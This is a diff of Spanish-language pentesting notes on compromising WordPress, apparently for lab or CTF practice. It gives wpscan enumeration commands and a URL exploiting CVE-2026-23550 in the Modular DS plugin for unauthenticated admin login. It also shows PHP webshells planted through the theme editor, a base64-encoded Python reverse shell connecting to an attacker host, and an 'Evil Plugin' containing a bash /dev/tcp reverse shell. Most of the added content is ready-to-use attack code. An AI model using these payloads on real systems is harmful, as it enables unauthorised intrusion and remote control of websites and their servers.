@@ -85,8 +85,8 @@ admin:password
 ❯ wpscan --url http://<IP>/ -e 
 # Enumerar usuarios 
 
-❯ wpscan --url http://<IP> --api-token="<TOKEN>" --enumerate p --plugins-detection mixed   <- (MEJOR OPCIÓN USAR API TOKEN)
-❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>"   
+❯ wpscan --url http://<IP> --api-token="<TOKEN>" --enumerate p --plugins-detection mixed  <- (MEJOR OPCIÓN USAR API TOKEN)
+❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>" 
 # Con API token → CVEs y detalles de vulnerabilidades
 
 ❯ wpscan --url http://<IP>/ -e u,vp,vt,dbe
@@ -294,10 +294,10 @@ NOTA:
 ?>
 ```
 
-### Modular DS < 2.5.2 - CVE-2026-23550: Privilege Escalation 
+### Modular DS < 2.5.2 - CVE-2026-23550: Unauthenticated  Privilege Escalation 
 * [CVE-2026-23550](https://hurayraiit.com/blog/cve-2026-23550-critical-privilege-escalation-in-wordpress-modular-ds-plugin-cvss-10/)
 ```bash 
-# Colocar esta url en el navegador y automáaticamente ingresas al panel del admin 
+# Colocar esta url en el navegador y automáticamente ingresas al panel del admin 
 http://IP/api/modular-connector/login/anything?origin=mo&type=foo
 ```
 
@@ -306,12 +306,53 @@ http://IP/api/modular-connector/login/anything?origin=mo&type=foo
 
 ### Opción 1 — Editar tema existente (más rápido)
 ```bash
+# Ir a esta IP es la forma más fácil de editar el tema   <- MEJOR 
+# El Theme File Editor siempre carga el tema activo por defecto, después ir a 'Theme Functions' y ahí pegar el código PHP 
+	http://IP/wp-admin/theme-editor.php   
+
+Paso 1: 
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"; } ?>
+
+NOTA: 
+	- Si ya hay contenido PHP y empieza con '<?php' quitar la misma parte inicial y colocar el resto del paso 1 en el archivo que se esta editando 
+
+Paso 2:
+# Ejecutar comandos 
+	http://IP/?cmd=id 
+	http://IP/?cmd=which+bash+python3+python+nc    # Ver si esta instalado python3 
+
+Paso 3: En Kali 
+# Cualquier payload con comillas anidadas que pase por un webshell → base64 siempre.
+# Crear el BASE64
+python3 -c "
+import base64
+payload = '''import socket,subprocess,os
+s=socket.socket()
+s.connect(('IP_Kali',4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(['/bin/bash','-i'])'''
+print(base64.b64encode(payload.encode()).decode())
+"
+
+# Ejecutar la Revershell en la web 
+	http://IP/?cmd=echo+BASE64AQUI|base64+-d|python3
+	
+```
+
+```bash 
+# Recbir la reverse shell en Kali
+❯ rlwrap nc -nlvp 4444
+```
+
+## Opción 1 - Variante 2 (Similar)
+```bash 
 # Appearance → Theme File Editor → seleccionar tema activo → 404.php Template
 
 Forma 1:
 # Webshell para ejecutar comandos
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
-
 
 Forma 2:
 # Reverse shell directa hacia Kali 
@@ -319,7 +360,7 @@ Forma 2:
 
 
 NOTA:
-	# Despues de actualizar el template, enviar una petición para que se ejecute el código en:
+	- Despues de actualizar el template, enviar una petición para que se ejecute el código en:
 		http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php
 ```
 
@@ -329,7 +370,7 @@ Para la forma 1:
 ❯ http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php?cmd=whoami
 
 Para la forma 2:
-# Para reverse shell en Kali
+# Recibir la reverse shell en Kali
 ❯ rlwrap nc -nlvp 443
 ```
 
@@ -350,6 +391,11 @@ Para la forma 2:
 ❯ http://<IP>/wp-content/themes/hestia/cmd.php?cmd=whoami
 ```
 
+```bash 
+# Recibir la revershell en Kali 
+❯ penelope -p 443
+```
+
 ### Opción 3 — Plugin con reverse shell
 ```bash
 Paso 1:
@@ -357,7 +403,7 @@ Paso 1:
 ❯ nvim wordpress-plugin/wordpress-plugin.php
 
 
-Forma 1: Contenido del archivo   <- MEJOR OPCIÓN 
+Paso 1, forma 1: Contenido del archivo   <- MEJOR OPCIÓN 
 <?php
 /**
 * Plugin Name: Evil Plugin
@@ -371,7 +417,7 @@ if (isset($_GET['cmd'])) {
 ?>
 
 
-Forma 2: Contenido del archivo
+Paso 1, forma 2: Contenido del archivo
 <?php
 /**
 * Plugin Name: Evil Plugin
@@ -381,6 +427,7 @@ Forma 2: Contenido del archivo
 system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'");
 ?>
 
+
 Paso 2:
 ❯ zip -r wordpress-plugin.zip wordpress-plugin/
 # Plugins → Add New → Upload Plugin → Install Now → Activate
@@ -389,7 +436,7 @@ Paso 2:
 
 
 ```bash 
-Paaso 3:
+Paso 3:
 Para la forma 1:
 # Ejecutar comandos desde la webshell 
 ❯ http://IP/wordpress/wp-content/plugins/wordpress-plugin/wordpress-plugin.php?cmd=whoami
